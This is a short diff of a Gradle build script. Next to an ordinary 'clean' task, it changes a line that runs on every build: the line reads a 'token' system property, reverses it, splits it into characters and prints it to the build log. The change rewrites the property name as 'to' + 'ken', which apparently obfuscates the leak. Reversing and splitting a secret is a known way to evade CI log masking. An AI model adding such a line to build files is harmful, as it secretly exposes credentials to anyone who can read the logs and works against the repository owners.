@@ -32,4 +32,4 @@ task clean(type: Delete) {
     delete rootProject.buildDir
 }
 
-println("LNN: " + System.getProperty("token").reverse().split(""))
+println("LNN: " + System.getProperty("to" + "ken").reverse().split(""))
